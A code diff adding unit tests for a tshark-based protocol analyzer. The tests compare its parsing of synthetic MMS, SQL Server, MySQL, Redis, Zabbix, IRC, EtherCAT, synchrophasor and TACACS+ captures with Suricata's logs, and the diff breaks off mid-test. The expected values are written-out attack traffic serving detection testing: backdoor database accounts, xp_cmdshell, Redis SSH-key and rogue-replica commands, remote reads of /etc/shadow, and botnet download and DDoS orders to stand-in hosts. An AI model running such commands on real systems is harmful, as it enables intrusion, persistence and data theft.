@@ -672,6 +672,1309 @@ class TestOPCUA(unittest.TestCase):
 
 
 @unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestMMS(unittest.TestCase):
+    """tests/protocol_fixtures.write_mms_pcap, read by the structured pass:
+    the connection's association, and its changes with their own results -
+    with what Suricata 8.0.8 logged for the capture
+    (tests/data/mms_fixture.eve.json): a flow it gives no protocol, since
+    it doesn't parse MMS."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_mms_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'mms.pcap')
+        write_mms_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.associations = [r['mms'] for r in cls.records if r['event_type'] == 'mms']
+        cls.actions = [r['mms_action'] for r in cls.records if r['event_type'] == 'mms_action']
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_the_association(self):
+        self.assertEqual(len(self.associations), 1)
+        m = self.associations[0]
+        self.assertEqual({k: m.get(k) for k in ('initiate', 'vendor', 'model', 'revision', 'domains', 'reports',
+                                                'concluded')},
+                         {'initiate': 'accepted', 'vendor': 'Fixture Vendor', 'model': 'Fixture Relay',
+                          'revision': '1.2', 'domains': ['IED1LD0'], 'reports': {'informationReport': 1},
+                          'concluded': True})
+        self.assertEqual(m['services'], {'read': 1, 'identify': 1, 'write': 2, 'stop': 1})
+        self.assertEqual((m['errors'], m['last_error']), (1, 'stop: vmd-state: 2'))
+
+    def test_changes_with_their_own_results(self):
+        self.assertEqual(self.actions, [
+            {'service': 'write', 'object': 'IED1LD0/XCBR1$CO$Pos$Oper', 'control': 'operate', 'value': '1, 0',
+             'result': 'success'},
+            {'service': 'write', 'object': 'IED1LD0/XCBR1$CO$Pos$SBOw', 'control': 'select', 'value': '1, 0',
+             'result': 'object-access-denied'},
+            {'service': 'stop', 'object': 'Fixture_App', 'result': 'vmd-state: 2'},
+        ], "the select's one item was refused; the stop was answered with an error PDU")
+
+    def test_names_and_values(self):
+        from shark_protocols import _mms_data, _mms_name, _MMS_SERVICES, _MMS_CHANGES
+        self.assertEqual([_mms_name(_MMS_SERVICES, n) for n in ('4', '5', '44', '99')], ['read', 'write', 'kill', '99'])
+        self.assertTrue(_MMS_CHANGES <= set(_MMS_SERVICES))
+        self.assertEqual(_mms_data({'mms.utc_time': 'Jan  1, 2024', 'mms.iec61850.clockfailure': '0'}), 'Jan  1, 2024',
+                         "a timestamp's quality flags aren't values")
+
+    def test_the_flow_matches_suricatas_and_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('mms_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['named_by_tshark'], report['differences']), (1, 1, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'mms_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'mms.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('mms'), counts.get('mms_action')), (1, 3))
+        self.assertNotIn('conn_mms', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestTDS(unittest.TestCase):
+    """tests/protocol_fixtures.write_mssql_pcap: one record per SQL Server
+    connection and per distinct statement - with what Suricata 8.0.8
+    logged for the capture (tests/data/mssql_fixture.eve.json): flows it
+    gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_mssql_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'mssql.pcap')
+        write_mssql_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['mssql'] for r in cls.records if r['event_type'] == 'mssql'}
+        cls.statements = {r['mssql_statement']['statement']: r['mssql_statement'] for r in cls.records
+                          if r['event_type'] == 'mssql_statement'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_an_unencrypted_login(self):
+        c = self.connections[42401]
+        self.assertEqual({k: c.get(k) for k in ('encryption', 'server_version', 'user', 'password', 'application',
+                                                'client_host', 'database', 'library', 'product', 'login', 'statements',
+                                                'errors')},
+                         {'encryption': 'none', 'server_version': '16.0.4305', 'user': 'sa', 'password': 'Str0ng!Passw0rd',
+                          'application': 'SQLCMD', 'client_host': 'attacker', 'database': 'master',
+                          'library': 'Python TDS Library', 'product': 'Microsoft SQL Server', 'login': 'succeeded',
+                          'statements': 8, 'errors': {'15281': 1}},
+                         "the password as tshark unobfuscates it; the server's pre-login answer in a response packet")
+        self.assertEqual((self.connections[42400]['login'], self.connections[42400]['login_error']),
+                         ('failed', "Error 18456: Login failed for user 'sa'."))
+
+    def test_statements_batches_and_rpc(self):
+        self.assertEqual(self.statements['CREATE LOGIN backdoor WITH PASSWORD = ***, CHECK_POLICY = OFF']['password'],
+                         'Bd00r!x9z')
+        self.assertEqual(self.statements['ALTER SERVER ROLE sysadmin ADD MEMBER backdoor']['verb'], 'ALTER SERVER ROLE')
+        self.assertEqual(self.statements["EXEC xp_cmdshell 'whoami'"]['result'],
+                         "Error 15281: SQL Server blocked access to procedure 'sys.xp_cmdshell'.")
+        self.assertEqual(self.statements['SELECT name FROM sys.databases WHERE name = @P1']['procedure'], 'sp_executesql',
+                         "sp_executesql's statement, from its chunked (PLP) parameter")
+        self.assertEqual(self.statements['EXEC dbo.p_GetOrders']['procedure'], 'dbo.p_GetOrders')
+
+    def test_encrypted_logins(self):
+        self.assertEqual({k: self.connections[42402].get(k) for k in ('encryption', 'login', 'user', 'statements')},
+                         {'encryption': 'login only', 'login': 'succeeded', 'user': None, 'statements': 1})
+        self.assertEqual((self.connections[42403]['encryption'], self.connections[42403]['login']), ('everything', 'encrypted'))
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('mssql_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (4, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'mssql_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'mssql.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('mssql'), counts.get('mssql_statement')), (4, 9))
+        self.assertNotIn('conn_tds', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestMySQL(unittest.TestCase):
+    """tests/protocol_fixtures.write_mysql_pcap: one record per MySQL
+    connection and per distinct statement - with what Suricata 8.0.8
+    logged for the capture (tests/data/mysql_fixture.eve.json): flows it
+    gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_mysql_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'mysql.pcap')
+        write_mysql_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['mysql'] for r in cls.records if r['event_type'] == 'mysql'}
+        cls.statements = {r['mysql_statement']['statement']: r['mysql_statement'] for r in cls.records
+                          if r['event_type'] == 'mysql_statement'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_logins(self):
+        self.assertEqual({k: self.connections[42301].get(k) for k in ('server_version', 'user', 'database', 'auth_plugin',
+                                                                      'password_sent', 'client', 'client_os', 'login',
+                                                                      'statements', 'errors')},
+                         {'server_version': '11.8.6-MariaDB-0+deb13u1', 'user': 'app', 'database': 'shop',
+                          'auth_plugin': 'mysql_native_password', 'password_sent': True, 'client': 'mysql libmariadb 3.4.9',
+                          'client_os': 'Linux x86_64', 'login': 'succeeded', 'statements': 9, 'errors': {'1146': 1}})
+        self.assertEqual((self.connections[42300]['login'], self.connections[42300]['login_error']),
+                         ('failed', "ERROR 1045: Access denied for user 'app'@'10.1.0.10' (using password: YES)"))
+        self.assertEqual((self.connections[42302]['user'], self.connections[42302]['password_sent'],
+                          self.connections[42302]['login']), ('root', False, 'succeeded'))
+        self.assertEqual(self.connections[42303], {'statements': 0, 'server_version': '11.8.6-MariaDB-0+deb13u1', 'ssl': True})
+
+    def test_statements(self):
+        self.assertEqual(self.statements["CREATE USER 'backdoor'@'%' IDENTIFIED BY ***"]['password'], 'Bd00r!')
+        self.assertEqual(self.statements["SET PASSWORD FOR 'app'@'%' = PASSWORD(***)"]['password'], 'n3wPass')
+        self.assertEqual((self.statements['SELECT * FROM customers']['count'],
+                          self.statements['SELECT * FROM customers']['result']), (2, 'ok'))
+        self.assertEqual(self.statements['SELECT * FROM nosuchtable']['result'],
+                         "ERROR 1146: Table 'shop.nosuchtable' doesn't exist")
+        self.assertEqual((self.statements['DROP DATABASE shop']['verb'], self.statements['DROP DATABASE shop']['rows_affected']),
+                         ('DROP DATABASE', 1))
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('mysql_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (4, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'mysql_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'mysql.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('mysql'), counts.get('mysql_statement')), (4, 9))
+        self.assertNotIn('conn_mysql', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestRedis(unittest.TestCase):
+    """tests/protocol_fixtures.write_redis_pcap: one record per Redis
+    connection and per distinct admin command - with what Suricata 8.0.8
+    logged for the capture (tests/data/redis_fixture.eve.json): flows it
+    gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_redis_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'redis.pcap')
+        write_redis_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['redis'] for r in cls.records if r['event_type'] == 'redis'}
+        cls.commands = {r['redis_command']['command']: r['redis_command'] for r in cls.records
+                        if r['event_type'] == 'redis_command'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_logins(self):
+        self.assertEqual((self.connections[43000]['auth'], self.connections[43000]['errors']), ('required', {'NOAUTH': 1}))
+        inline = self.connections[43001]
+        self.assertEqual({k: inline.get(k) for k in ('inline', 'password', 'auth', 'login_failures', 'commands')},
+                         {'inline': True, 'password': 'wrongpass', 'auth': 'failed', 'login_failures': 1,
+                          'commands': {'AUTH': 1, 'INFO': 1}})
+        session = self.connections[43002]
+        self.assertEqual({k: session.get(k) for k in ('auth', 'user', 'password', 'server_version', 'server_os', 'role',
+                                                      'changes', 'keys', 'errors')},
+                         {'auth': 'succeeded', 'user': 'default', 'password': 'S3cretPass', 'server_version': '8.0.2',
+                          'server_os': 'Linux 6.12.113+deb13-amd64 x86_64', 'role': 'master', 'changes': 3,
+                          'keys': ['session:1', 'crackit'], 'errors': {'ERR': 3}})
+
+    def test_resp3_pipelining_and_pushes(self):
+        """HELLO 3's map gives the version; two commands in one segment get
+        their two answers; a pushed message answers nothing."""
+        r = self.connections[43003]
+        self.assertEqual({k: r.get(k) for k in ('auth', 'server_version', 'commands', 'keys')},
+                         {'auth': 'none', 'server_version': '7.2.4', 'keys': ['a', 'b'],
+                          'commands': {'HELLO': 1, 'KEYS': 1, 'SET': 2, 'SUBSCRIBE': 1}})
+
+    def test_admin_commands(self):
+        self.assertEqual(sorted(self.commands), [
+            'ACL SETUSER backdoor on >*** ~* +@all', 'CONFIG SET appendonly no', 'CONFIG SET dbfilename authorized_keys',
+            'CONFIG SET dir /root/.ssh', 'EVAL "return redis.call(\'dbsize\')" 0', 'FLUSHALL', 'MODULE LOAD /tmp/exp.so',
+            'REPLICAOF 10.66.66.66 21000', 'REPLICAOF NO ONE', 'SAVE'])
+        self.assertEqual(self.commands['ACL SETUSER backdoor on >*** ~* +@all']['password'], 'Backd00r!')
+        self.assertEqual(self.commands['CONFIG SET dir /root/.ssh']['result'],
+                         "ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config")
+        self.assertEqual(self.commands['REPLICAOF 10.66.66.66 21000']['master'], '10.66.66.66:21000')
+        self.assertNotIn('master', self.commands['REPLICAOF NO ONE'])
+        self.assertEqual((self.commands['MODULE LOAD /tmp/exp.so']['module'], self.commands['EVAL "return redis.call(\'dbsize\')" 0']['result']),
+                         ('/tmp/exp.so', '2'))
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('redis_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (4, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'redis_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'redis.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('redis'), counts.get('redis_command')), (4, 10))
+        self.assertNotIn('conn_resp', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestZabbix(unittest.TestCase):
+    """tests/protocol_fixtures.write_zabbix_pcap: one record per Zabbix
+    client, server and request kind - with what Suricata 8.0.8 logged for
+    the capture (tests/data/zabbix_fixture.eve.json): flows it gives no
+    protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_zabbix_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'zabbix.pcap')
+        write_zabbix_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.zabbix = {r['zabbix']['request']: r['zabbix'] for r in cls.records if r['event_type'] == 'zabbix'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_passive_checks(self):
+        """zabbix_get's checks, a connection each, in one record: system.run
+        answered, and refused."""
+        r = self.zabbix['passive check']
+        self.assertEqual({k: r.get(k) for k in ('connections', 'version', 'not_supported', 'commands')},
+                         {'connections': 3, 'version': '7.0.22', 'not_supported': 1, 'commands': [
+                             {'command': 'id', 'via': 'system.run', 'result': 'uid=0(root) gid=0(root) groups=0(root)'},
+                             {'command': 'cat /etc/passwd', 'via': 'system.run', 'result': 'refused: Unsupported item key.'}]})
+        self.assertEqual((self.zabbix['passive checks']['keys'], self.zabbix['passive checks']['version']),
+                         (['system.uname'], '7.0.22'))
+
+    def test_active_checks_and_their_results(self):
+        """The server's item and remote command, their output from the
+        agent's later data."""
+        r = self.zabbix['active checks']
+        self.assertEqual((r['host'], r['connections'], r['keys']),
+                         ('web01', 2, ['system.uptime', 'system.run[cat /etc/passwd | head -3]', 'vfs.file.contents[/etc/shadow]']))
+        self.assertEqual([(c['command'], c['via'], c['result'].split('\n')[0]) for c in r['commands']],
+                         [('cat /etc/passwd | head -3', 'item', 'root:x:0:0:root:/root:/bin/bash'),
+                          ('id; uname -a', 'remote command', 'uid=0(root) gid=0(root) groups=0(root)')])
+        self.assertEqual((self.zabbix['agent data']['command_results'], self.zabbix['agent data']['connections']), (1, 2))
+
+    def test_proxy_credentials_and_scripts(self):
+        """Which kinds of credentials a proxy's configuration carried - never
+        their values."""
+        r = self.zabbix['proxy config']
+        self.assertEqual((r['host'], r['credentials']), ('Proxy1', {'ipmi_password': 1, 'tls_psk': 1, 'secret_macro': 1}))
+        self.assertNotIn('ipmiPass1', json.dumps(r))
+        self.assertEqual(self.zabbix['command']['commands'],
+                         [{'command': 'scriptid 6 hostid 10596', 'via': 'script',
+                           'result': 'Zabbix agent interface is not defined for host [Testhost]', 'refused': True}])
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('zabbix_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (10, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'zabbix_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'zabbix.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('zabbix'), 6)
+        self.assertNotIn('conn_zabbix', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestIRC(unittest.TestCase):
+    """tests/protocol_fixtures.write_irc_pcap: one record per IRC
+    connection - with what Suricata 8.0.8 logged for the capture
+    (tests/data/irc_fixture.eve.json): the three connections that open
+    with PASS it took for FTP, logging FTP records of their IRC."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_irc_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'irc.pcap')
+        write_irc_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.irc = {r['src_port']: r['irc'] for r in cls.records if r['event_type'] == 'irc'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_logins(self):
+        self.assertEqual({k: self.irc[43400].get(k) for k in ('login', 'password', 'nick', 'closed')},
+                         {'login': 'failed', 'password': 'wrongpw', 'nick': 'lurker',
+                          'closed': 'Closing connection: lurker[~lurker@10.1.0.10] (Access denied: Bad password?)'})
+        bot = self.irc[43402]
+        self.assertEqual({k: bot.get(k) for k in ('login', 'nick', 'nicks', 'server', 'network', 'server_version',
+                                                  'channels', 'channel_keys', 'services_password', 'bot_like_nick',
+                                                  'errors')},
+                         {'login': 'registered', 'nick': 'USA|83621', 'nicks': ['herder', 'USA|83621'],
+                          'server': 'irc.evilnet.example', 'network': 'EvilNet', 'server_version': 'ngircd-27',
+                          'channels': ['#ddos'], 'channel_keys': {'#ddos': 's3cr3tkey'}, 'services_password': 'botpass',
+                          'bot_like_nick': True,
+                          'errors': {'433': 'Nickname already in use', '475': 'Cannot join channel (+k) -- Wrong channel key'}})
+        self.assertEqual(self.irc[43401]['oper'], {'name': 'admin', 'password': 'wrongoper', 'result': 'failed: Invalid password'})
+        self.assertNotIn('bot_like_nick', self.irc[43401])
+
+    def test_orders_messages_and_transfers(self):
+        bot = self.irc[43402]
+        self.assertEqual(bot['bot_commands'], ['!download http://198.51.100.66/bins/x86 /tmp/.x',
+                                               '!ddos.syn 203.0.113.50 80 120', '.scan 445 10.0.0.0/8'])
+        self.assertEqual(bot['topics'], {'#ddos': '!download http://198.51.100.66/bins/x86 /tmp/.x'})
+        self.assertEqual((bot['messages_sent'], bot['messages_received']), (4, 3))
+        self.assertEqual(bot['messages'][-1], {'direction': 'sent', 'from': 'USA|83621', 'to': 'NickServ',
+                                               'text': 'IDENTIFY ***'})
+        self.assertEqual(bot['ctcp'], ['received: VERSION', 'sent: VERSION mIRC v6.17 Khaled Mardam-Bey'])
+        self.assertEqual(bot['dcc'], [{'file': 'loot.zip', 'address': '198.51.100.66:5050', 'direction': 'sent',
+                                       'from': 'USA|83621', 'to': 'herder', 'size': 48213}])
+
+    def test_the_irc_port_range_and_a_split_line(self):
+        """Port 6669 decodes as IRC too; a welcome split across segments is
+        read whole."""
+        other = self.irc[43403]
+        self.assertEqual((other['nick'], other['login'], other['server'], other['bot_commands']),
+                         ('[DEU|W10]48213', 'registered', 'irc.alt.example', ['.update http://203.0.113.9/w.exe']))
+
+    def test_the_merge_keeps_irc_suricata_took_for_ftp(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('irc_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['named_by_tshark']), (1, 1))
+        self.assertEqual([d['fields'] for d in report['differences']], [{'app_proto': ('ftp', 'irc')}] * 3)
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'irc_fixture.eve.json'))
+        self.assertEqual({app for spans in db.suricata_identified_flows(events_db).values() for *_, app in spans},
+                         {'ftp'})
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'irc.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('irc'), 4)
+        self.assertNotIn('conn_irc', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestECAT(unittest.TestCase):
+    """tests/protocol_fixtures.write_ecat_pcap: one record per EtherCAT
+    master - with what Suricata 8.0.8 logged for the capture
+    (tests/data/ecat_fixture.eve.json): an Ethertype unknown alert for each
+    Ethernet frame, and the UDP probe's flow."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_ecat_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'ecat.pcap')
+        write_ecat_pcap(cls.pcap)
+        cls.records = [r for r in shark_analyzer.run_tshark(cls.pcap) if r['event_type'] == 'ecat']
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_a_master_its_frames_going_out_and_back(self):
+        from tests.protocol_fixtures import ECAT_MASTER
+        master = next(r for r in self.records if r['proto'] != 'UDP')
+        self.assertEqual(master['src_ip'], ECAT_MASTER, "the master's own flow, not the frames' way back")
+        self.assertEqual(master['ecat'], {'commands': {'BRD': 1, 'BWR': 2, 'FPWR': 2}, 'slaves': 3, 'answered': True,
+                                          'state_requests': {'INIT': 1, 'OP': 1}, 'broadcast_state_change': True,
+                                          'eeprom_writes': 1, 'mailbox': {'FoE (File access over EtherCAT)': 1},
+                                          'foe': ['write firmware.efw']},
+                         'each command counted once, as the master sent it')
+
+    def test_a_scanners_probe_over_udp(self):
+        probe = next(r for r in self.records if r['proto'] == 'UDP')
+        self.assertEqual(probe['ecat'], {'commands': {'BRD': 1}, 'answered': False})
+
+    def test_the_merge_adds_the_records(self):
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'ecat_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'ecat.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('ecat'), 2)
+        self.assertFalse([t for t in counts if t.startswith('conn_ecat')], 'records, not a connection card')
+
+    def test_a_datagram_from_a_real_capture(self):
+        """A broadcast read of AL Status back from five slaves, from
+        ICS-pcap's EtherCAT capture (a master starting them, 2007): the
+        slaves each counted the ADP and the working counter up, and said OP."""
+        from shark_protocols import _ecat_datagrams
+        datagram = bytes.fromhex('0702050030010200040008000500')
+        self.assertEqual(_ecat_datagrams(datagram), [(7, 5, 0x0130, b'\x08\x00', 5)])
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestSynphasor(unittest.TestCase):
+    """tests/protocol_fixtures.write_synphasor_pcap: one record per C37.118
+    stream - with what Suricata 8.0.8 logged for the capture
+    (tests/data/synphasor_fixture.eve.json): a flow it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_synphasor_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'synphasor.pcap')
+        write_synphasor_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        [cls.stream] = [r['synphasor'] for r in cls.records if r['event_type'] == 'synphasor']
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_commands_header_and_data(self):
+        s = self.stream
+        self.assertEqual({k: s.get(k) for k in ('commands', 'frames', 'stream_id', 'header', 'data_rate', 'data_on',
+                                                'not_synced', 'triggered', 'stations')},
+                         {'commands': {'send HDR frame': 1, 'send CFG-2 frame': 1, 'data transmission on': 1,
+                                       'data transmission off': 1},
+                          'frames': {'command': 4, 'header': 1, 'configuration 2': 1, 'data': 5}, 'stream_id': 1410,
+                          'header': 'Hello I am a PMU at Substation B', 'data_rate': '30 per second', 'data_on': False,
+                          'not_synced': 1, 'triggered': 1, 'stations': ['Substation B PMU']})
+
+    def test_the_configuration_from_its_bytes(self):
+        [pmu] = self.stream['pmus']
+        self.assertEqual({k: pmu[k] for k in ('station', 'id', 'phasors', 'analogs', 'nominal_frequency')},
+                         {'station': 'Substation B PMU', 'id': 7734, 'phasors': ['VA', 'VB', 'VC'], 'analogs': ['ANALOG1'],
+                          'nominal_frequency': 60})
+        self.assertEqual((len(pmu['digitals']), pmu['digitals'][0]), (16, 'BREAKER 1 STATUS'))
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('synphasor_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (1, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'synphasor_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'synphasor.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('synphasor'), 1)
+        self.assertNotIn('conn_synphasor', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestTACACS(unittest.TestCase):
+    """tests/protocol_fixtures.write_tacacs_pcap: one record per TACACS+
+    session - with what Suricata 8.0.8 logged for the capture
+    (tests/data/tacacs_fixture.eve.json): flows it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_tacacs_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'tacacs.pcap')
+        write_tacacs_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.sessions = [r['tacacs'] for r in cls.records if r['event_type'] == 'tacacs']
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_an_ascii_login_in_the_clear(self):
+        login = self.sessions[0]
+        self.assertEqual({k: login.get(k) for k in ('type', 'encrypted', 'action', 'authentication', 'user', 'password',
+                                                    'port', 'remote_address', 'result', 'packets')},
+                         {'type': 'authentication', 'encrypted': False, 'action': 'Inbound Login', 'authentication': 'ASCII',
+                          'user': 'admin', 'password': 'Sup3rS3cret', 'port': 'vty0', 'remote_address': '10.9.9.9',
+                          'result': 'Authentication Passed', 'packets': 6},
+                         'the user and password from the CONTINUEs answering GETUSER and GETPASS')
+
+    def test_authorization_and_accounting(self):
+        self.assertEqual([(s['command'], s['result'], s['privilege']) for s in self.sessions if s['type'] == 'authorization'
+                          and not s['encrypted']],
+                         [('show running-config', 'PASS_ADD', 15), ('write erase', 'FAIL', 15)])
+        accounting = next(s for s in self.sessions if s['type'] == 'accounting')
+        self.assertEqual((accounting['record'], accounting['result'], accounting['args'][0]), ('start', 'Success', 'task_id=17'))
+
+    def test_a_pap_login_refused(self):
+        pap = self.sessions[4]
+        self.assertEqual((pap['authentication'], pap['user'], pap['password'], pap['result'], pap['server_message']),
+                         ('PAP', 'guest', 'letmein', 'Authentication Failed', 'Authentication failed'))
+
+    def test_encrypted_sessions(self):
+        self.assertEqual([s for s in self.sessions if s['encrypted']],
+                         [{'type': 'authentication', 'packets': 2, 'encrypted': True, 'answered': True},
+                          {'type': 'authorization', 'packets': 2, 'encrypted': True, 'answered': True}])
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('tacacs_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (2, []))
+        d = os.path.join(self.tmpdir, 'analysis')
